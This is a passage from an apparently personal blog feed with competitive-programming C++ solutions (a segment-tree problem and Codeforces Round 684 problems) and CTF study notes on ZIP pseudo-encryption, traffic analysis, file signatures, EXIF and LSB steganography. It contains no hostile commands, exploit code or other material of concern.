class="hljs-number">0</span>;i&lt;<span class="hljs-number">16</span>;i++)<br>&#123;<br>count+=<span class="hljs-built_in">dfs</span>(<span class="hljs-number">0</span>, i%<span class="hljs-number">4</span>, i/<span class="hljs-number">4</span>);<br>&#125;<br>cout&lt;&lt;count;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="H-奇偶覆盖"><a href="#H-奇偶覆盖" class="headerlink" title="H. 奇偶覆盖"></a>H. 奇偶覆盖</h1><p>线段树初步版本，未完善</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">1e5</span>+<span class="hljs-number">5</span>;<br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">node</span><br>&#123;<br>    <span class="hljs-type">int</span> l,r,h;<br>    <span class="hljs-type">bool</span> <span class="hljs-keyword">operator</span>&lt; (<span class="hljs-type">const</span> node&amp; a)<span class="hljs-type">const</span><br>    &#123;<br>        <span class="hljs-keyword">return</span> h&lt;a.h;<br>    &#125;<br>&#125;e[N*<span class="hljs-number">2</span>];<br><br><span class="hljs-type">int</span> a[N*<span class="hljs-number">2</span>];<br><span class="hljs-type">int</span> sum[N*<span class="hljs-number">2</span>*<span class="hljs-number">4</span>],flag[N*<span class="hljs-number">2</span>*<span class="hljs-number">4</span>];<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">cal</span><span class="hljs-params">(<span class="hljs-type">int</span> l,<span class="hljs-type">int</span> r,<span class="hljs-type">int</span> root)</span></span><br><span class="hljs-function"></span>&#123;<br>    sum[root]=(a[r]-a[l])-sum[root];<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">pushup</span><span class="hljs-params">(<span class="hljs-type">int</span> root)</span></span><br><span class="hljs-function"></span>&#123;<br>    sum[root]=sum[root&lt;&lt;<span class="hljs-number">1</span>]+sum[root&lt;&lt;<span class="hljs-number">1</span>|<span class="hljs-number">1</span>];<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">pushdown</span><span class="hljs-params">(<span class="hljs-type">int</span> l,<span class="hljs-type">int</span> r,<span class="hljs-type">int</span> root)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span>(!flag[root])<br>        <span class="hljs-keyword">return</span> ;<br>    flag[root&lt;&lt;<span class="hljs-number">1</span>]^=<span class="hljs-number">1</span>;<br>    flag[root&lt;&lt;<span class="hljs-number">1</span>|<span class="hljs-number">1</span>]^=<span class="hljs-number">1</span>;<br>    <span class="hljs-type">int</span> mid=l+r&gt;&gt;<span class="hljs-number">1</span>;<br>    <span class="hljs-built_in">cal</span>(l,mid,root&lt;&lt;<span class="hljs-number">1</span>);<br>    <span class="hljs-built_in">cal</span>(mid,r,root&lt;&lt;<span class="hljs-number">1</span>|<span class="hljs-number">1</span>);<br>    flag[root]=<span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">update</span><span class="hljs-params">(<span class="hljs-type">int</span> l,<span class="hljs-type">int</span> r,<span class="hljs-type">int</span> root,<span class="hljs-type">int</span> ql,<span class="hljs-type">int</span> qr)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span>(l&gt;=ql&amp;&amp;r&lt;=qr)<br>    &#123;<br>        <span class="hljs-built_in">cal</span>(l,r,root);<br>        flag[root]^=<span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">return</span> ;<br>    &#125;<br>    <span class="hljs-built_in">pushdown</span>(l,r,root);<br>    <span class="hljs-type">int</span> mid=l+r&gt;&gt;<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">if</span>(mid&gt;ql)<br>        <span class="hljs-built_in">update</span>(l,mid,root&lt;&lt;<span class="hljs-number">1</span>,ql,qr);<br>    <span class="hljs-keyword">if</span>(mid&lt;qr)<br>        <span class="hljs-built_in">update</span>(mid,r,root&lt;&lt;<span class="hljs-number">1</span>|<span class="hljs-number">1</span>,ql,qr);<br>    <span class="hljs-built_in">pushup</span>(root);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> n;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;n);<br>    <span class="hljs-type">int</span> x1,x2,y1,y2,all=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++)<br>    &#123;<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d%d%d%d&quot;</span>,&amp;x1,&amp;y1,&amp;x2,&amp;y2);<br>        e[<span class="hljs-number">2</span>*i<span class="hljs-number">-1</span>].l=<span class="hljs-built_in">min</span>(x1,x2);<br>        e[<span class="hljs-number">2</span>*i<span class="hljs-number">-1</span>].r=<span class="hljs-built_in">max</span>(x1,x2);<br>        e[<span class="hljs-number">2</span>*i<span class="hljs-number">-1</span>].h=<span class="hljs-built_in">min</span>(y1,y2);<br>        e[<span class="hljs-number">2</span>*i].l=<span class="hljs-built_in">min</span>(x1,x2);<br>        e[<span class="hljs-number">2</span>*i].r=<span class="hljs-built_in">max</span>(x1,x2);<br>        e[<span class="hljs-number">2</span>*i].h=<span class="hljs-built_in">max</span>(y1,y2);<br>        a[<span class="hljs-number">2</span>*i<span class="hljs-number">-1</span>]=x1,a[<span class="hljs-number">2</span>*i]=x2;<br>    &#125;<br>    <span class="hljs-built_in">sort</span>(a+<span class="hljs-number">1</span>,a+<span class="hljs-number">1</span>+n*<span class="hljs-number">2</span>);<br>    all=<span class="hljs-built_in">unique</span>(a+<span class="hljs-number">1</span>,a+<span class="hljs-number">1</span>+n*<span class="hljs-number">2</span>)-a<span class="hljs-number">-1</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=<span class="hljs-number">2</span>*n;i++)<br>        e[i].l=<span class="hljs-built_in">lower_bound</span>(a+<span class="hljs-number">1</span>,a+<span class="hljs-number">1</span>+all,e[i].l)-a,e[i].r=<span class="hljs-built_in">lower_bound</span>(a+<span class="hljs-number">1</span>,a+<span class="hljs-number">1</span>+all,e[i].r)-a;<br>    <span class="hljs-built_in">sort</span>(e+<span class="hljs-number">1</span>,e+<span class="hljs-number">1</span>+<span class="hljs-number">2</span>*n);<br>    ll ans=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=<span class="hljs-number">2</span>*n;i++)<br>    &#123;<br>        ans+=sum[<span class="hljs-number">1</span>]*(e[i].h-e[i<span class="hljs-number">-1</span>].h);<br>        <span class="hljs-built_in">update</span>(<span class="hljs-number">1</span>,all,<span class="hljs-number">1</span>,e[i].l,e[i].r);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%lld\n&quot;</span>,ans);<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> ACM </tag>
            
            <tag> 蓝桥杯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF学习记录-Misc-压缩包加密&amp;取证技术</title>
      <link href="/2020/11/d50e0ee8.html"/>
      <url>/2020/11/d50e0ee8.html</url>
      
        <content type="html"><![CDATA[<h1 id="压缩包加密"><a href="#压缩包加密" class="headerlink" title="压缩包加密"></a>压缩包加密</h1><ol><li><p>暴力破解</p><p>eg. RAR Cracker（Windows）</p><span id="more"></span></li><li><p>ZIP伪加密</p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>ZIP文件中，文件头和每个文件的核心目录区都有通用标记位。核心目录区的通用标记位距离核心目录区头504B0102的偏移为8字节，其本身占2字节，在低位表示这个文件是否被加密，将其改为0x01后，再次打开会提示输入密码（伪密码），只需将标记复位，即可正常打开。</p><p><em><strong>binwalk -e</strong></em>也可以无视伪加密，<em><strong>MacOS</strong></em>也可直接打开压缩包。</p><p>类似的，文件头处的通用标记位距离文件头[^504B0304] 的偏移为6字节，其本身占2个字节，最低位表示这个文件是否被加密，但该位被改为0x01的伪加密压缩包<strong>不能</strong>通过Binwalk或MacOS直接提取，需要手动修改标志位。</p></li><li><p>已知明文攻击</p></li></ol><h1 id="取证技术"><a href="#取证技术" class="headerlink" title="取证技术"></a>取证技术</h1><h2 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h2><h3 id="WireShark-amp-Tshark"><a href="#WireShark-amp-Tshark" class="headerlink" title="WireShark&amp;Tshark"></a>WireShark&amp;Tshark</h3><ol><li><p>常见操作</p><p>Wireshark的[^统计]菜单可以查看流量包的大致情况（包含哪些协议，IP地址参与了会话等等），对于切割后小的TCP数据流，可以使用[^追踪TCP流]的方法，即可获取会话中双方传输的所有数据，方便进一步分析。</p><p>对于HTTP等常见协议，WireShark提供了导出对象功能，可以方便的提取传输过程中发送的文件等信息</p></li></ol><h2 id="特殊种类的流量包"><a href="#特殊种类的流量包" class="headerlink" title="特殊种类的流量包"></a>特殊种类的流量包</h2><p>对于一个USB流量包，Tshark工具可以方便地获取纯数据字段：</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs excel">tshark -r filename.pcapng -<span class="hljs-built_in">T</span> fields -e usb.capdata<br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF学习记录-Misc-图片隐写</title>
      <link href="/2020/11/9ab7588f.html"/>
      <url>/2020/11/9ab7588f.html</url>
      
        <content type="html"><![CDATA[<h1 id="直接附加"><a href="#直接附加" class="headerlink" title="直接附加"></a>直接附加</h1><h2 id="常用文件头-x2F-文件尾"><a href="#常用文件头-x2F-文件尾" class="headerlink" title="常用文件头&#x2F;文件尾"></a>常用文件头&#x2F;文件尾</h2><table><thead><tr><th>文件名</th><th>文件头</th><th>文件尾</th></tr></thead><tbody><tr><td>JPEG(jpg)</td><td>FF D8 FF</td><td>FF D9</td></tr><tr><td>PNG(png)</td><td>89 50 4E 47</td><td>AE 42 60 82</td></tr><tr><td>GIF(gif)</td><td>47 49 46 38</td><td>00 3B</td></tr><tr><td>zip</td><td>50 4B 03 04</td><td>50 4B</td></tr><tr><td>RAR</td><td>52 61 72 21</td><td></td></tr><tr><td>WAV</td><td>57 41 56 45</td><td></td></tr><tr><td>avi</td><td>41 56 49 20</td><td></td></tr><tr><td>MPEG(mpg)</td><td>00 00 01 BA&#x2F;B3</td><td></td></tr><tr><td>mov</td><td>6D 6F 6F 76</td><td></td></tr></tbody></table><h1 id="EXIF隐写"><a href="#EXIF隐写" class="headerlink" title="EXIF隐写"></a>EXIF隐写</h1><h2 id="exiftool工具常用命令"><a href="#exiftool工具常用命令" class="headerlink" title="exiftool工具常用命令"></a>exiftool工具常用命令</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>对于图片Lighthouse.jpg<br><span class="hljs-regexp">//</span>为图片添加一个comment标签，内容为ExifModifyTesting<br>exiftool -comment=ExifModifyTesting ./Lighthouse.jpg<br><span class="hljs-regexp">//</span>查看EXIF信息<br>exiftool ./Lighthouse.jpg<br></code></pre></td></tr></table></figure><h1 id="LSB"><a href="#LSB" class="headerlink" title="LSB"></a>LSB</h1><p>LSB全称least significant bit，最低有效位</p><p>PNG文件中的图像像数一般是由RGB三原色（红绿蓝）组成，每一种颜色占用8位，取值范围为0x00~0xFF，即有256种颜色，一共包含了256的3次方的颜色，即16777216 种颜色</p><p>人类的眼睛可以区分约1000万种不同的颜色</p><p>这意味着人类的眼睛无法区分余下的颜色大约有6777216种</p><p>LSB隐写就是修改RGB颜色分量的最低二进制位（LSB），而人类的眼睛不会注意到这前后的变化</p><p>每个像数可以携带3比特的信息</p><h2 id="检测隐写常用工具-stegsolve-zsteg"><a href="#检测隐写常用工具-stegsolve-zsteg" class="headerlink" title="检测隐写常用工具 - stegsolve - zsteg"></a>检测隐写常用工具 - stegsolve - zsteg</h2><h1 id="盲水印"><a href="#盲水印" class="headerlink" title="盲水印"></a>盲水印</h1><h2 id="添加与提取"><a href="#添加与提取" class="headerlink" title="添加与提取"></a>添加与提取</h2><p><a href="https://github.com/chishaxie/BlindWaterMark">BlindWaterMark</a> 频谱隐写可直接使用Adobe Audition</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CodeForces-Round#684-Div.2</title>
      <link href="/2020/11/676fcf4a.html"/>
      <url>/2020/11/676fcf4a.html</url>
      
        <content type="html"><![CDATA[<h1 id="A-Buy-the-String"><a href="#A-Buy-the-String" class="headerlink" title="A. Buy the String"></a>A. Buy the String</h1><span id="more"></span><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;cstdio&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">char</span> c[<span class="hljs-number">1005</span>];<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-type">int</span> T;<br>    <span class="hljs-type">int</span> sum_1=<span class="hljs-number">0</span>,sum_0=<span class="hljs-number">0</span>,ans;<br>    cin&gt;&gt;T;<br>    <span class="hljs-keyword">while</span>(T--)<br>    &#123;<br>        <span class="hljs-type">int</span> n,c0,c1,h;<br>        cin&gt;&gt;n&gt;&gt;c0&gt;&gt;c1&gt;&gt;h;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>        &#123;<br>            cin&gt;&gt;c[i];<br>            <span class="hljs-keyword">if</span>(c[i]==<span class="hljs-string">&#x27;1&#x27;</span>)   sum_1++;<br>            <span class="hljs-keyword">else</span>    sum_0++;<br>        &#125;<br>        <span class="hljs-comment">//cout&lt;&lt;sum_0&lt;&lt;endl&lt;&lt;sum_1&lt;&lt;endl;</span><br>        ans=c0*sum_0+c1*sum_1;<br>        <span class="hljs-comment">/*if(c0==c1)</span><br><span class="hljs-comment">            ans=c0*sum_0+c1*sum_1;</span><br><span class="hljs-comment">        if(c0&gt;c1)</span><br><span class="hljs-comment">            ans=min((c1*(sum_1+sum_0))+sum_0*h, ans);</span><br><span class="hljs-comment">        if(c0&lt;c1)</span><br><span class="hljs-comment">            ans=min(c0*(sum_1+sum_0)+sum_1*h, ans);*/</span><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=sum_0;i++)<br>        &#123;<br>            <span class="hljs-type">int</span> now=(i*h)+((sum_1+i)*c1)+(sum_0-i)*c0;<br>            ans=<span class="hljs-built_in">min</span>(ans, now);<br>        &#125;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=sum_1;i++)<br>        &#123;<br>            <span class="hljs-type">int</span> now=(i*h)+((sum_0+i)*c0)+(sum_1-i)*c1;<br>            ans=<span class="hljs-built_in">min</span>(ans, now);<br>        &#125;<br>        cout&lt;&lt;ans&lt;&lt;endl;<br>        ans=<span class="hljs-number">0</span>;  sum_1=<span class="hljs-number">0</span>;    sum_0=<span class="hljs-number">0</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="B-Sum-of-Medians"><a href="#B-Sum-of-Medians" class="headerlink" title="B. Sum of Medians"></a>B. Sum of Medians</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;cstdio&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;vector&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">char</span> c[<span class="hljs-number">1005</span>];<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-type">int</span> T;<br>    <span class="hljs-type">int</span> sum_1=<span class="hljs-number">0</span>,sum_0=<span class="hljs-number">0</span>,ans;<br>    cin&gt;&gt;T;<br>    <span class="hljs-keyword">while</span>(T--)<br>    &#123;<br>        <span class="hljs-type">int</span> n,k;<br>        cin&gt;&gt;n&gt;&gt;k;<br>        <span class="hljs-type">int</span> m=n*k;<br>        vector&lt;<span class="hljs-type">int</span>&gt;<span class="hljs-built_in">a</span>(m);<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;m;i++)<br>        &#123; <br>        cin&gt;&gt;a[i];<br>         &#125;   <br>        <span class="hljs-type">long</span> <span class="hljs-type">long</span> tot=<span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span>(n==<span class="hljs-number">2</span>)<br>        &#123;<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;m;i+=<span class="hljs-number">2</span>)<br>                tot+=a[i];<br>            cout&lt;&lt;tot&lt;&lt;endl;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>        <span class="hljs-type">int</span> inter=(n+<span class="hljs-number">1</span>)/<span class="hljs-number">2</span>;<br>        <span class="hljs-type">int</span> left=n-inter;<br>        left+=<span class="hljs-number">1</span>;<br>        <span class="hljs-type">int</span> x=<span class="hljs-number">1</span>,in=<span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=m<span class="hljs-number">-1</span>;i&gt;=<span class="hljs-number">0</span>;i--)<br>        &#123;<br>            <span class="hljs-keyword">if</span>(x%left==<span class="hljs-number">0</span>)<br>            &#123;<br>                tot+=a[i];<br>                in++;<br>            &#125;<br>            x+=<span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">if</span>(in&gt;=k)   <span class="hljs-keyword">break</span>;<br>        &#125;<br>        cout&lt;&lt;tot&lt;&lt;endl;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="C1-Binary-Table-Easy-Version"><a href="#C1-Binary-Table-Easy-Version" class="headerlink" title="C1. Binary Table (Easy Version)"></a>C1. Binary Table (Easy Version)</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;cstdio&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;vector&gt;</span></span><br> <br>        <span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br> <br>        <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">case4</span><span class="hljs-params">(vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt;&amp;b , vector&lt;string&gt;&amp; a , <span class="hljs-type">int</span> i , <span class="hljs-type">int</span> j)</span></span>&#123;<br>            a[i][j]=a[i+<span class="hljs-number">1</span>][j]=a[i][j+<span class="hljs-number">1</span>]=a[i+<span class="hljs-number">1</span>][j+<span class="hljs-number">1</span>]=<span class="hljs-string">&#x27;0&#x27;</span>;<br>            vector&lt;<span class="hljs-type">int</span>&gt;c;<br>            c.<span class="hljs-built_in">push_back</span>(i);<br>            c.<span class="hljs-built_in">push_back</span>(j);<br>            c.<span class="hljs-built_in">push_back</span>(i+<span class="hljs-number">1</span>);<br>            c.<span class="hljs-built_in">push_back</span>(j);<br>            c.<span 